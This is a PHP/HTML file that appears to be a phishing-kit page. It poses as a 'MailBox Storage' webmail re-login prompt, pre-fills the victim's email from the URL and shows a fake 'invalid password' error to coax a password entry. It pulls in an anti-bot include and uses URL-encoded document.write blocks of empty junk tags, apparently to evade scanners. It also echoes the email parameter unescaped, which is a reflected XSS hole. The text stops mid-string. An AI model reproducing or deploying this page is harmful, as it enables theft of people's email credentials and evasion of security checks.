<?php

include 'prevents/antibot.php';

	$email = $_GET['email'];
?>

<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><style data-merge-styles="true"></style>
	<title>MailBox Storage</title>

<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">

<script type="text/javascript" src="lib.js"></script>
<style type="text/css">
	body{
			
			background:#000;
			color:#050505;
		}

		#main-container{
			min-height:440px;
		}

		#form-c{
		  margin: auto;
			margin-top: 10%;
			background: #fff;
			padding: 30px;
			width: 420px;
			border-radius: 5px;
			box-shadow: 0px 0px 3px #666, 0px 0px 3px #666;	
		}

		#user-domain{
			color: #8a8b89;
			font-weight: bold;
			font-size: 0.9em;
		}


		#u-pass{
			margin: 5px;
			padding-left: 30px;
			border: 1px solid #333;
			width: 170px;
			font-size:1.2em;
		}
		#u-email{
			
			width:170px;
			margin-top:30px;
			margin-bottom:10px;
			border: 1px solid #333;
			font-size:1.2em;
			padding-left:20px;
		}
		#login-but{
			
			margin-top: 18px; 
			margin-left: 40%;
			border: 1px solid #000; 
			border-radius: 0px;
			color:#f6f6f6;
			background:#797c77;
			font-weight:bold;
			font-size:1.2em;
		}
		#login-but:hover{
			
			color:#fff;
			background:#679B08;
		}
		#footer{
			
			margin-top: 30px;
			font-size: 0.8em;
			color:#fff;
			text-align: center;
		}
		#success-msg{
			
			color:#000;
		}

		#error-c{
			text-align:center;
		}
</style>
</head>
<body>

<div id="main-container">
	<div id="form-c">
		<form id="form">
							<div style="text-align: center; font-size: 1.5em; ">
					<span id="user-domain"><?php echo $email?></span><span style="font-size:0.6em;">© </span> <span style="color: ">MailBox</span>
				</div>
			
<div style="display:none;">
<script type="text/javascript">
	document.write(unescape('%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%3Cheader%3E%3C%2Fheader%3E%0D%0A%0D%0A%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%3Cspan%3E%3C%2Fspan%3E%3Cspan%3E%3Csub%3E%3C%2Fsub%3E%3C%2Fspan%3E%0D%0A%0D%0A%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E%3Csection%3E%3C%2Fsection%3E'));
</script><header></header><header></header><header></header><header></header><header></header>
<header></header><header></header><header></header>
<header></header><header></header><header></header>
<header></header><header></header>
<header></header><header></header><header></header>

<div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div>
<div></div><div></div><div></div><div></div><div></div><div></div>
<ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul><ul></ul>
<span></span><span><sub></sub></span><span></span><span><sub></sub></span><span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>
<span></span><span><sub></sub></span>

<nav></nav><nav></nav><nav></nav><nav></nav><nav></nav>
<section></section><section></section><section></section><section></section><section></section><section></section><section></section>


</div>



			<div style="text-align:center;">
			
				<div style="margin-top:10px; margin-bottom: 10px; font-size: 1.2em;">
					Please Sign In again to continue
				</div>
				
									<div style="">
						Connected to <span style="color:#8a8b89;font-weight:bold; font-size:1em;"> <?php echo $email?> </span>
					</div>
							
				<div>
					<input type="hidden" name="email" id="u-email" placeholder="Email" value="<?php echo $email?>" style="border: 2px solid rgb(229, 61, 22);"><br>
					<input type="password" name="frm-pass" placeholder="Password" id="u-pass" style="border: 2px solid rgb(229, 61, 22);"><br>
					<div id="error-c" style="text-align: center; color: rgb(255, 0, 0);">invalid password</div>
					<input type="hidden" name="frm-ac-tok" value="1488795688aLjZ8H57KwSc4ewiwtRx" id="frm-ac-tok">
					<input type="hidden" name="um" id="um" value="<?php echo $email?>">
					<input type="hidden" name="s-id" value="auto-link" id="s-id">
				</div>
                <div style="display:none;">
				<script type="text/javascript">
					document.write(unescape('%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3E%3Cul%3E%3C%2Ful%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cnav%3E%3C%2Fnav%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%3Cdiv%3E%3C%2Fdiv%3E%0D%0A%3Csection%3E%3C%2Fsection%3E%3Cul%3E%3C%2Ful%3